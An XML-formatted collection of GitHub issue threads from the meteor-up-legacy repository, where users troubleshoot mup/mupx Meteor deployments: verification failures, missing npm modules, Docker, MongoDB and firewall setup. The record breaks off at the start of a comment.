      <Owner>MasterJames</Owner>
      <Body>It mentions that here.
https://github.com/arunoda/meteor-up/tree/mupx#verbose-output
The tricky thing is be care ful of spaces you do nt wa nt.
DEBUG=\* mupx &lt;command&gt;
There can't be a space after debug.
It seems weird to me, I still don't get it to be honest. What it is or how it works and I looked it up some too still remains kind of a mystery. I looked it up because I thought it wasn't working on windows but it was the wrongly added space that caused it to fail.

Also noting: https://github.com/arunoda/meteor-up/tree/mupx#build-options
</Body>
    </Comment>
    <Comment>
      <Owner>paolo-g</Owner>
      <Body>Yeah, it's strange. The build works, so I didn't modify the options. Here's the (sanitized) output from `DEBUG=* mupx deploy`: (doesn't tell much; notice that everything works up until the deployment verification)

`Started TaskList: Deploy app 'app' (linux)
[IP] - Uploading bundle
  nodemiral:sess:IP copy file - src: /tmp/&lt;numbers&gt;/bundle.tar.gz, dest: /opt/app/tmp/bundle.tar.gz, vars: undefined +0ms
[IP] - Uploading bundle: SUCCESS
[IP] - Sending environment variables
  nodemiral:sess:IP copy file - src: /usr/local/lib/node_modules/mupx/templates/linux/env.list, dest: /opt/app/config/env.list, vars: {"env":{"ROOT_URL":"http://IP","MONGO_URL":"mongodb://user:pass@IP:27017/app","METEOR_SETTINGS":"{\"kadira\":{\"appId\":\"id\",\"appSecret\":\"secret\"},\"public\":{}}","CLUSTER_ENDPOINT_URL":"http://IP:80"},"appName":"app"} +5.9m
[IP] - Sending environment variables: SUCCESS
[IP] - Initializing start script
  nodemiral:sess:IP copy file - src: /usr/local/lib/node_modules/mupx/templates/linux/start.sh, dest: /opt/app/config/start.sh, vars: {"appName":"app","useLocalMongo":false,"port":80} +298ms
[IP] - Initializing start script: SUCCESS
[IP] - Invoking deployment process
[IP] - Invoking deployment process: SUCCESS
[IP] - Verifying deployment
[IP] x Verifying deployment: FAILED

```
-----------------------------------STDERR-----------------------------------
0 No README data

&gt; fibers@1.0.5 install /bundle/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
ansi-regex@0.2.1 node_modules/ansi-regex

ansi-styles@1.1.0 node_modules/ansi-styles

escape-string-regexp@1.0.3 node_modules/escape-string-regexp

chalk@0.5.1 node_modules/chalk

has-ansi@0.1.0 node_modules/has-ansi

supports-color@0.2.0 node_modules/supports-color

strip-ansi@0.3.0 node_modules/strip-ansi

eachline@2.3.3 node_modules/eachline

type-of@2.0.1 node_modules/type-of

amdefine@1.0.0 node_modules/amdefine

asap@2.0.3 node_modules/asap

underscore@1.5.2 node_modules/underscore

meteor-promise@0.5.0 node_modules/meteor-promise

promise@7.0.4 node_modules/promise

source-map-support@0.3.2 node_modules/source-map-support

semver@4.1.0 node_modules/semver

source-map@0.1.32 node_modules/source-map

fibers@1.0.5 node_modules/fibers
=&gt; Starting meteor app on port:80

=&gt; Redeploying previous version of the app

-----------------------------------STDOUT-----------------------------------

To see more logs type 'mup logs --tail=50'

----------------------------------------------------------------------------`
```

And here's the ufw status verbose output:
`Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From

---

22/tcp                     LIMIT IN    Anywhere
80/tcp                     ALLOW IN    Anywhere
443/tcp                    ALLOW IN    Anywhere
22/tcp (v6)                LIMIT IN    Anywhere (v6)
80/tcp (v6)                ALLOW IN    Anywhere (v6)
443/tcp (v6)               ALLOW IN    Anywhere (v6)`

Perhaps mupx is trying to connect to the (remote) mongo db from my deployment machine for some reason? That port is blocked by default with `deny (incoming)`
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm not seeing anything useful there after staring for some time. I'm thinking you should post your settings next.
I did wonder about it saying useLocalMongo false? 
</Body>
    </Comment>
    <Comment>
      <Owner>paolo-g</Owner>
      <Body>Sure, here you go:
`{
  // Server authentication info
  "servers": [
    {
      "host": "IP",
      "username": "root",
      "pem": "PEM PATH",
      "env": {}
    }
  ],

  // Install MongoDB on the server. Does not destroy the local MongoDB on future setups
  "setupMongo": false,

  // Application name (no spaces).
  "appName": "&lt;name&gt;",

  // Location of app (local directory). This can reference '~' as the users home directory.
  // i.e., "app": "~/Meteor/my-app",
  // This is the same as the line below.
  "app": "PATH ON MY DEPLOYMENT MACHINE",

  // Configure environment
  // ROOT_URL must be set to your correct domain (https or http)
  "env": {
    "PORT": 80,
    "ROOT_URL": "http://IP",
    "MONGO_URL": "mongodb://USER:PASS@IP:27017/DB"
  },

  // Meteor Up checks if the app comes online just after the deployment.
  // Before mup checks that, it will wait for the number of seconds configured below.
  "deployCheckWaitTime": 15,

  // show a progress bar while uploading. 
  // Make it false when you deploy using a CI box.
  "enableUploadProgressBar": true
}`

Perhaps the "useLocalMongo false" you mentioned is because of `"setupMongo": false,`? We have the db already instantiated on the target, and I'm starting to think mupx on my deployment machine wants to query it (remotely, but why would that be?)
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>appName is okay blank? 
Deploy wait time could be longer to be safe maybe 120.
You should check some firewall rules aren't blocking the mongo link by SSHing into the target and trying to connect etc.
Also note the port at kadirahq/meteor-up is worth trying and has better active dev support available too.
</Body>
    </Comment>
    <Comment>
      <Owner>paolo-g</Owner>
      <Body>appName is set but I removed it here

Tried to increase the deploy time but it still fails

Not sure about this third idea - the app works fine (can access the db) when it is running on the server. The issue is that mupx's "Verifying deployment" step on my deployment machine fails unless the firewall is open. I can't add firewall rules for all the IPs I deploy from, it's just too variable given the number of places I code from.

Is the community moving to kadirahq/meteor-up?
</Body>
    </Comment>
  </Issue_140>
  <Issue_141>
    <Repository>meteor-up-legacy</Repository>
    <Title>Getting error When update to METEOR@1.3-rc.4</Title>
    <Owner>arunoda</Owner>
    <Body>`
## Meteor Up: Production Quality Meteor Deployments

Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : D:\Gitlab\nizulzaim\bongkah
Using buildOptions : {}

Started TaskList: Deploy app 'appName' (linux)
[..] - Uploading bundle
[..] - Uploading bundle: SUCCESS
[..] - Sending environment variables
[..] - Sending environment variables: SUCCESS
[..] - Initializing start script
[..] - Initializing start script: SUCCESS
[..] - Invoking deployment process
[..] - Invoking deployment process: SUCCESS
[..] - Verifying deployment
[..] x Verifying deployment: FAILED

```
    -----------------------------------STDERR-----------------------------------
     WARN deprecated   npm -g install npm@latest
    npm WARN deprecated
    npm WARN deprecated (Depending on how Node.js was installed on your system, you
    npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
    npm WARN deprecated on Windows, run them from an Administrator prompt.)
    npm WARN deprecated
    npm WARN deprecated If you're running the version of npm bundled with
    npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
    npm WARN deprecated will be bundled with a version of npm@2, which has some smal
    npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
    npm WARN deprecated semver behavior.
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data

    &gt; fibers@1.0.5 install /bundle/bundle/programs/server/node_modules/fibers
    &gt; node ./build.js


    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------`
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>People try extending the deploy wait time in the settings first before a need for a deeper dive into the possible problem.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I see you had posted about 4he wait time but deleted it. I suspect a random delay may have been the problem anyway.
</Body>
    </Comment>
  </Issue_141>
  <Issue_142>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mupx and small SSD</Title>
    <Owner>arunoda</Owner>
    <Body>Hi all! I have two physical disks: hard &amp; ssd. I want to move current version of my project to the ssd and latest builds to the hard (because I have too small SSD disk). It's possible?

And, should I use kadira:mup or still arunoda:mupx?

Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm not sure in the new version if there's a solution for this so I'm partial to asking as well at kadirahq port as it might become a feature request better as well.
I would say you could SSH into the target machine and change a mount point between deploys there as well. I'll find something on desktop and post that too.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>This is the file to look at I believe.
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh
The app path is /op/$APPNAME
But it's ENV_FILE=$APP_PATH/config/env.list
That might let you set override those as well  [I'm not certain about that.] as other means other then editing the files.
Anyway I'd say you make a mount point to /op/OtherDriveAppName etc.

Really you could make a bridge locally to whatever like, like this with SSHFS 
https://www.digitalocean.com/community/tutorials/how-to-use-sshfs-to-mount-remote-file-systems-over-ssh
And just over right directly to the server.
</Body>
    </Comment>
    <Comment>
      <Owner>JWo1F</Owner>
      <Body>@MasterJames can I use `mount -o bind` for it?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Yes it should be possible to use the --bind flag of the mount command to remount subfolders. Obviously avoid read-only options.
</Body>
    </Comment>
  </Issue_142>
  <Issue_143>
    <Repository>meteor-up-legacy</Repository>
    <Title>npm modules can't be found after deployment in both mup and mupx?</Title>
    <Owner>arunoda</Owner>
    <Body>I use two npm modules in my meteor project: ebay-api and coupon-code. When I do a mup deploy everything seems to go well, but the mup logs show that it can't find ebay-api or coupon-code:

```
Error: Cannot find module 'coupon-code'
     at Function.Module._resolveFilename (module.js:338:15)
     at Function.Module._load (module.js:280:25)
     at Module.require (module.js:364:17)
     at require (module.js:380:17)
     at Object.Npm.require (/opt/AppName/app/programs/server/boot.js:150:18)
     at server/ebay.js:3:1
     at server/ebay.js:56:1
     at /opt/RelaySupplyControlPanel/app/programs/server/boot.js:242:10
     at Array.forEach (native)
     at Function._.each._.forEach (/opt/AppName/app/programs/server/node_modules/underscore/underscore.js:79:11)
     at /opt/AppName/app/programs/server/boot.js:137:5
     error: Forever detected script exited with code: `8`
```

If I go into `/opt/AppName/app/programs/server/node_modules` those packages aren't there, nor are they in `/opt/AppName/app/programs/server/npm`. They ARE in `/opt/AppName/app/programs/server/npm/npm-container/node_modules` though.

A work around I've used at the moment is to go into `/opt/AppName/app/programs/server` and run `npm install ebay-api` and `npm install coupon-code` which installs them locally in the node_modules directory and the app starts up fine. However as soon as I deploy again it wipes that out.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm not sure what happens with mup if the packages are installed locally vs globally.
I thought to add that the dev branch here called mupx is the better choice so try that if you have not yet. Also note that there is a port of mupx over to kardirahq, and these versions are soon depreciated.
</Body>
    </Comment>
    <Comment>
      <Owner>bmclain</Owner>
      <Body>Thanks for thr advice, I will give mupx a shot. The npm modules in question are installed locally in my source directory (home of my meteor project) instead of globally. What does mup typically expect, local or global?

I tried installing globally on the destination server but that didn't work, only a local install did which was interesting.

I will try installing globally on my dev server to see if mup picks it up before trying mupx.
</Body>
    </Comment>
    <Comment>
      <Owner>bmclain</Owner>
      <Body>Installing the npm modules on my dev server globally rather than in my project folder doesn't seem to solve the issue.
</Body>
    </Comment>
    <Comment>
      <Owner>bmclain</Owner>
      <Body>I also experience the problem with mupx:

```
 x Verifying deployment: FAILED

    -----------------------------------STDERR-----------------------------------
    g meteor app on port:80
    Cluster: connecting to 'mongodb' discovery backend
    Cluster: with options:  {}
    Cluster: registering this node as service 'web'
    Cluster:    endpoint url = http://XX.XX.XX.XX:80
    Cluster:    balancer url = http://somewebsite.com

    /bundle/bundle/programs/server/node_modules/fibers/future.js:245
                                                    throw(ex);
                                                          ^
    Error: Cannot find module 'ebay-api'
        at Function.Module._resolveFilename (module.js:338:15)
        at Function.Module._load (module.js:280:25)
        at Module.require (module.js:364:17)
        at require (module.js:380:17)
        at Object.Npm.require (/bundle/bundle/programs/server/boot.js:150:18)
        at server/ebay.js:2:1
        at server/ebay.js:56:1
        at /bundle/bundle/programs/server/boot.js:242:10
        at Array.forEach (native)
        at Function._.each._.forEach (/bundle/bundle/programs/server/node_modules/underscore/underscore.js:79:11)
        at /bundle/bundle/programs/server/boot.js:137:5

    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Okay well thanks for trying that.
Maybe post your settings file too please.
</Body>
    </Comment>
    <Comment>
      <Owner>markshust</Owner>
      <Body>This project hasn't been updated a while. I don't think the ability to use Meteor 1.3's new npm compatibility with package.json exists yet in mup.
</Body>
    </Comment>
    <Comment>
      <Owner>bmclain</Owner>
      <Body>This was with 1.2 in conjunction with meteorhacks:npm.

On Tue, Apr 5, 2016 at 1:09 PM, Mark Shust notifications@github.com wrote:

&gt; This project hasn't been updated a while. I don't think the ability to use
&gt; Meteor 1.3's new npm compatibility with package.json exists yet in mup.
&gt; 
&gt; &#8212;
&gt; You are receiving this because you authored the thread.
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/913#issuecomment-205951674
</Body>
    </Comment>
  </Issue_143>
  <Issue_144>
    <Repository>meteor-up-legacy</Repository>
    <Title>connect mongodb with other docker containers</Title>
    <Owner>arunoda</Owner>
    <Body>is it possible to get access to the mongodb (if it is installed with mupx in the same container) from an other container? I have 2 meteor apps in 2 containers but I have to connect my db from the first one with my new one
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You can have two settings files. One for each app but the second one does not setup Mongo and sets the Mongo url to point to the other one.
Still I think this is going to be better, as well as having better supported with the new ported version over at kadriahq, since these version here are soon depreciated. Also mupx is better for most and it sounds like you're using mupx the docker centric solution already. The kadirahq version is more like mupx but the settings file has wisely changed from json to just js.
</Body>
    </Comment>
    <Comment>
      <Owner>rlech</Owner>
      <Body>I decided to install my mongo on a second instance to seperate these things
</Body>
    </Comment>
    <Comment>
      <Owner>rlech</Owner>
      <Body>ok this is strange. I cant connect from the docker container deployment to my second aws instance where I host my mongodb only. I can access the mongodb from my local machine but when I try to deploy it with MONGO_URL and MONGO_OPLOG_URL set its giving me an error that the auth failed. Any Idea how to fix this?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>If your making a mongodb docker image you need to include expose.
https://docs.docker.com/engine/examples/mongodb/
You can SSH info a computer and test access to a port is working locally and then check from outside. Also using docker exec with bash can give you a shell in the docker container. 
</Body>
    </Comment>
    <Comment>
      <Owner>darkship</Owner>
      <Body>Hi 
I wanted to do the same. 
&lt;code&gt;ifconfig&lt;/code&gt; showed that my docker network was on inet adr:172.17.0.1 , then I tried &lt;code&gt;mongo --host 172.17.0.2 --port 27017&lt;/code&gt; and it worked.

So my  2 apps could access the same database.
</Body>
    </Comment>
  </Issue_144>
  <Issue_145>
    <Repository>meteor-up-legacy</Repository>
    <Title>Password protecting Mongo</Title>
    <Owner>arunoda</Owner>
    <Body>As I understand it, the Mongo setup made automatically by meteor-up is controlled to accept only local connections.  As a result, any local user can access the database.  I am deploying to a server that has other users, so this protection isn't enough.  Is it possible for meteor-up to automatically set up password-based (or other) authentication for use by Meteor?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Hmm... I'm not 100% on that. You can set the Mongo url to your own manually (or otherwise) setup instance of MongoDB. 
This might be a good suggestion for consideration in the new version being ported over at kadirahq. The devs are focused and more attentive there, so you could inquire there about it and ask if there's a solution on the original dev branch mupx or not. Basically the newer versions are docker centric and so maybe there's a way that's protected through some docker network isolation magic.
 I'll be thinking more about this later and try to add something if I learn more.
</Body>
    </Comment>
    <Comment>
      <Owner>edemaine</Owner>
      <Body>Right, I know I could setup Mongo myself with password authentication; I was hoping that the "setupMongo" feature could do this automatically.  I guess that's not an existing feature, but I could request it on the kadirahq version.  Thanks!
</Body>
    </Comment>
  </Issue_145>
  <Issue_146>
    <Repository>meteor-up-legacy</Repository>
    <Title>Connect to port outside docker</Title>
    <Owner>arunoda</Owner>
    <Body>In my app, I need to access ports outside of the docker image. (3306 for a MySQL server that is installed globally). Is this possible with mupx?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Where there's a will there's a way. Should do the job although I say that h&#233;sitent with little to go on.
Try and if there's a problem report back with logs and errors. 
I would try the new port at kadirahq first, then mupx the development branch here. The original mup is basically twice over depreciated but is useful still for some.
With mupx using docker you might need to open ports and the likes which is really more dependent on your provider and network setup.
</Body>
    </Comment>
  </Issue_146>
  <Issue_147>
    <Repository>meteor-up-legacy</Repository>
    <Title>[quick question] What is the difference between mup and mupx?</Title>
    <Owner>arunoda</Owner>
    <Body>I am confused to see two repositories, this one and https://github.com/kadirahq/meteor-up.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Well mup uses upstart while this was good and still prefered by some many problems were solved by mupx. Mupx is a docker centric approach. Docker containers take a little getting use to as they seem isolated and hard to access but once you know how it's possible the opposite is true. Using commands like "docker exec" you can open a bash shell or just execute commands like ls ps etc if they have been made available of course.
It made sense to rebrand it with kadirahq as it is a pretty complex suite of interconnected packages if you dig around. 
Anyway also mupx uses nginx.
In the near future meteor 1.3 will have ssl available through a newer version of nodejs. Definitely you'll want to know and use Docker or container logic weather it be microservices or what.
I've noted that once you are deployed you could just overwrite the files with rcp and restart. I even built my own file watch system like meteor does to rebuild the deployment from src but it just reloads files and overwrites the object structure they extend. So really once it's up you could make changes in other ways and in a sense you can avoid other problems. 
Mongo mounts a volume with Docker run command so those files are actually always available outside of the container and persist redeployment.
Anyway I hope that gives you a good base to learn more and maybe avoid a few more inquires. Maybe you'll be submitting PRs to the good people at kadirahq but unfortunately this version is depreciated by it and no longer merging fixes but it is at this time still the most production ready although I don't think any of them make that claim they are working pretty Darn well.
</Body>
    </Comment>
    <Comment>
      <Owner>pbreit</Owner>
      <Body>I'm still confused. Is there a recommendation on which version to use today?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Apparently it's still this arunoda but the development branch mupx. I figure it's best to work with the new branch and the available team to sort out smaller issues you have with it. If it can't cut you can come back here. Alternatively of this one is working great but if you want/need changes or support its all dedicated to kadirahq version now.
BTW I'm no official voice just here to help and migration to the new version is my hope for everyone.
</Body>
    </Comment>
    <Comment>
      <Owner>pbreit</Owner>
      <Body>Should I be able to use the same mup.json file "as-is" with mup and mupx? I noticed the sample file in the mupx readme is missing a few items like setupNode, etc.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Similar but best to manually adjust your settings from the new default one.
It's a js file now not a json file.
</Body>
    </Comment>
    <Comment>
      <Owner>pbreit</Owner>
      <Body>Yes, that makes sense. But I was worried about not including things like setupNode and nodeVersion (which are missing from the mupx example). Are those no longer necessary?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Right that's true it's in the docker image used now.
</Body>
    </Comment>
    <Comment>
      <Owner>nmaro</Owner>
      <Body>Subscribing to this. Please update when the kadirahq becomes the standard :)
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Mupx and kadirahq port are docker centric and nginx for ssl. Mup uses stud.
The new version has loads of important needed features especially moving forward. 
</Body>
    </Comment>
    <Comment>
      <Owner>nmaro</Owner>
      <Body>The readme of kadirahq still says

"This version of Meteor Up is still in development. Please check arunoda/meteor-up for the stable version."

@MasterJames Have you been using the kadirahq version?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>No. Kind of waiting for Meter 1.3.?  to stabilize and be well integrated there.I expected a TLS version of node integrated as well,  but its still in progress at meteor. Those comments are in regards to stability meaning will not change or is changing lots. 
These versions are depreciated by the new kadirahq version.
I'm encouraging people to go there and try it and work with them to address the various situations that arise so it's better sooner faster.it should already be better because of loads of features. Hooks and custom docker images are two that can solve loads of problems. 
To be honest I see it as a good starting point to learn and modify as needed. Being open source PRs are only being accepted in the new version that was built for 1.2 so I find myself trying to bring awareness to others about the new version because most of the issues posted here i fear will go unanswered otherwise.
</Body>
    </Comment>
  </Issue_147>
  <Issue_148>
    <Repository>meteor-up-legacy</Repository>
    <Title>Cannot deploy after switching from mup to mupx on Digital Ocean droplet</Title>
    <Owner>arunoda</Owner>
    <Body>I've been running an app at alpha stage on a Digital Ocean droplet for a long time, and deploying with mup.  I hadn't worked on it in some time and I read that mup is no longer maintained, so I tried to use mupx.

On this server I run several small sites, with nginx.  I had been using the nginx proxy method for my meteor app with mup to deploy.

I really do not want to purchase and maintain a whole new droplet just for this app.

Do I understand correctly that mupx is trying to install its own nginx in a docker container?  I'm new to docker.

I googled and found some similar problems but no solutions.  A lot of threads I read were discussing SSL, which I'm not even attempting for this app (yet).

In mup.json (with mup) I had port set to 3000.  with the mupx and the new mup.json, I tried both port 80 (as in the default file).  I'm trying 3000 now and I get this:

 -----------------------------------STDERR-----------------------------------
        Failed to remove container (myappname-frontend): Error response from daemon: No such container: myappname-frontend
        docker: Error response from daemon: failed to create endpoint myappname on network bridge: Error starting userland proxy: listen tcp 0.0.0.0:3000: bind: address already in use.
        -----------------------------------STDOUT-----------------------------------
        m-staging-etfinvest-com
        base: Pulling from meteorhacks/meteord
        518dc1482465: Already exists
        a3ed95caeb02: Already exists
        a3ed95caeb02: Already exists
        a3ed95caeb02: Already exists
        537c534356b6: Already exists
        b65a0e1e554b: Already exists
        a3ed95caeb02: Already exists
        a3ed95caeb02: Already exists
        Digest: sha256:b5a4f6efa98e4070792ed36d33b14385a28e6ceda691a492ee5b9f2431b1515a
        Status: Image is up to date for meteorhacks/meteord:base
        3496c08ad6a7d90d480857882bd7f230643da4292133a901152641a063022172
        ----------------------------------------------------------------------------
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Ya  it's pretty comprehensive so anything already running could cause conflicts.
Sounds like maybe that's what's happened there.
There is a migration guide (see bottom of mupx readme) to mupx from mup try following that with a fresh Ubuntu 14+ get a basic proof of function and then try adjusting to your existing proxy etc.
Some still have a need for mup but it's worth rebuilding things with a container way of thinking lIke mupx does.
Also note there's a new version of mupx being ported over to kadirahq so if you want support that's the route/version as that one will eventually depreciate mupx here.
</Body>
    </Comment>
    <Comment>
      <Owner>chrisco23</Owner>
      <Body>Thanks for your response.  I may end up trying a fresh ubuntu droplet as a test case.  But actually I was posting in a rush yesterday and I really did mean to post on the mupx repo and not here, so maybe I'll give that a try first.
</Body>
    </Comment>
    <Comment>
      <Owner>chrisco23</Owner>
      <Body>I just got things working, _I think_.  Verifying deployment is still FAILED, but the site is there.  

I believe these were all the things that were required (maybe not all):
1.  Blow away the old app deployed with mup
2.  Kill the upstart / node listening on port 3000
3.  rm -rf all /fibers everywhere I could find (hit the node-fibers is missing stuff)
4. mupx setup &amp;&amp; mupx deploy

I won't close yet as the verification failure still seems to be a problem to me.  Here is what the last deployment gives:

x Verifying deployment: FAILED

```
    -----------------------------------STDERR-----------------------------------
    inished
      COPY Release/fibers.node
    make: Leaving directory `/bundle/bundle/programs/server/node_modules/fibers/build'
    Installed in `/bundle/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node`
    ansi-regex@0.2.1 node_modules/ansi-regex

    ansi-styles@1.1.0 node_modules/ansi-styles

    escape-string-regexp@1.0.4 node_modules/escape-string-regexp

    chalk@0.5.1 node_modules/chalk

    strip-ansi@0.3.0 node_modules/strip-ansi

    supports-color@0.2.0 node_modules/supports-color

    has-ansi@0.1.0 node_modules/has-ansi

    eachline@2.3.3 node_modules/eachline

    type-of@2.0.1 node_modules/type-of

    amdefine@1.0.0 node_modules/amdefine

    asap@2.0.3 node_modules/asap

    underscore@1.5.2 node_modules/underscore

    meteor-promise@0.5.1 node_modules/meteor-promise

    promise@7.0.4 node_modules/promise

    source-map-support@0.3.2 node_modules/source-map-support

    semver@4.1.0 node_modules/semver

    source-map@0.1.32 node_modules/source-map

    fibers@1.0.8 node_modules/fibers
    =&gt; Starting meteor app on port:80
```
</Body>
    </Comment>
    <Comment>
      <Owner>chip</Owner>
      <Body>I followed the guide and ran into some issues, but suggestion by @chrisco23 to blow away the old app helped me get to this point (many thanks!). My staging instance is at least back up and running, but I'd like to see this error be resolved, so I'll continue to follow this.
</Body>
    </Comment>
    <Comment>
      <Owner>chip</Owner>
      <Body>As an update, I was able to get it to Verify deployment successfully by updating **mup.json** with `"deployCheckWaitTime": 30`. Hope that helps.
</Body>
    </Comment>
  </Issue_148>
  <Issue_149>
    <Repository>meteor-up-legacy</Repository>
    <Title>While deploying I can see nginx error page with mupx</Title>
    <Owner>arunoda</Owner>
    <Body>hey guys, Im not sure this is an issue or a normal behaviour but while deploying (on the last part) I can see nginx error page, this means the old deployment stopped before the new one is ready. So the question is; Is there anyway to fix this?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You mean you access the port with your browser and see a nginx default or error page because mupx is redeploy and the actual files are not available for a few seconds,  or there's something else showing up in the mupx ouput log? 
If it's in the log please post, otherwise it's probably normal.
You might find another solution like using rcp to overwrite files easier? Personally I've rebuilt meteors watch files code to watch from the deployed source and manage that on my own so you don't have to have a full version of meteor running where you typically overwrite files and it rebuilds but at that time it's not available either but with my solution it is more seamless. Anyway the logic is you have say 5 machines running so you don't care when you do a rolling update. It completely rebuilds the entire container while the other ones keep working.
Galaxy will likely be that level of redundancy so then you see there pricing is in fact not so bad.
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>ok thanks. I was thinking the same thing. the possible improvements for seamless deployment is using multiple servers I guess. but Im not sure but on "mup" it was seamless right?
</Body>
    </Comment>
  </Issue_149>
  <Issue_150>
    <Repository>meteor-up-legacy</Repository>
    <Title>Unexpected character '#' (1:0)</Title>
    <Owner>arunoda</Owner>
    <Body>When I run `mupx deploy` this appears after a long compilation time:

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
 It's the best way to monitor performance of your app.
 Visit: https://kadira.io/mup &#8221;

Meteor app path    : /home/jmfioris/Projects/handsoff-sigmate
Using buildOptions : {}
[BABEL] Note: The code generator has deoptimised the styling of "/build/bundle/programs/web.browser/b1a1f7c8ea907b7677a2889e4e2b41f5b6af977b.js" as it exceeds the max of "100KB".
Errors prevented bundling:
While processing files with pbastowski:angular-babel (for target
os.linux.x86_64):
packages/compileNGScript/plugin/ng-script-compiler.js:101:1: error: couldn't
process source due to parse error: 

Unexpected character '#' (1:0)
at processFile (packages/compileNGScript/plugin/ng-script-compiler.js:101:1)
at Array.forEach (native)
at Object.processFiles
(packages/compileNGScript/plugin/ng-script-compiler.js:38:1)

=&gt; Build Error. Check the logs printed above.
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>derek-fong</Owner>
      <Body>@cargaralo I encountered similar issue with my project because I have accidentally included the `meteor-up` package in my project folder. I have solved the problem by moving `meteor-up` away from the project folder (e.g. to your home directory) and it's working fine now.  
</Body>
    </Comment>
  </Issue_150>
  <Issue_151>
    <Repository>meteor-up-legacy</Repository>
    <Title>Difference between development version and mupx deployed production version. </Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

I'm hoping someone can point me in the right direction or give me a clue as to what could be causing the behavior I'm seeing on my production server. 

I use mupx to deploy to an in-house server and it works perfectly. I've never had an error and it's always worked flawlessly. 

Here's the issue I'm seeing. We use the mssql npm package to talk to our in house sql servers. Works great etc. In my settings file I have an option set for the mssql package that tells it to not use UTC dates in it's responses. The setting is picked up locally and works fine (on my mac). The same setting is deployed to the server via the settings.json file but it simply doesn't work. No matter what I do the sql server keeps sending the dates back to me in UTC format. 

I originally thought this was an issue with the SQL server but when I connect to the production database from my development environment (the same one the server connects to) using the exact same settings.json file that mupx uses the setting is picked up by the server and it works as expected. 

I can't for the life of me figure out what could possibly be so different that my local environment works perfectly but the production version doesn't when connected to the same database.

Node, NPM? 

The server is running on Ubuntu 14.04.4 and the deployment/configuration was completely handled by mupx. I used mupx to tail the server logs and there aren't any errors. 

If anyone has an idea I would greatly appreciate hearing from you as this issue is creating a huge pain in my backside! 

Thanks,

Sam 
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>First you should know that this has or is in the process of being ported to kadirahq (and so somewhat depreciated) and so you'll get better help after trying that version.
Second I'd say it's not typical problem so you need to post all your settings files and logs but considering there's no actual error it's again going to be hard to solve remotely with educated guesses. 
You pointed to the more important question is are all the versions of node etc correct?  I wondered if you needed to run meteor setup but that is usually more for the database which you're not using mupx for.
The process of isolating the problem might be tedious. So first I'd  check if this no UTC setting has been properly transfer/accepted/working on the deployment side. Maybe you need to explain that better as its the problem and I've no idea what that is and how it works if it's anot environment varable you could SSH into the deployment and check if it's set correctly etc.
</Body>
    </Comment>
    <Comment>
      <Owner>stoked74</Owner>
      <Body>Thanks Master James. I'm going to try that version now and see if it makes a difference. Hopefully it does. I appreciate the quick response. -Sam
</Body>
    </Comment>
  </Issue_151>
  <Issue_152>
    <Repository>meteor-up-legacy</Repository>
    <Title>I deployed with mupx but no phantomjs.</Title>
    <Owner>arunoda</Owner>
    <Body>Im getting this

```
stdout: 
[ip] spiderable: phantomjs failed at http://abc.com/en: { [Error: Command failed: Can't open '/dev/stdin'
[ip] ] killed: false, code: 255, signal: null } 
[ip] stderr: Can't open '/dev/stdin'
```

there was no setting related to  phantomjs when I do "init". should I need to add and if not for now if I install it manually, will it work?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
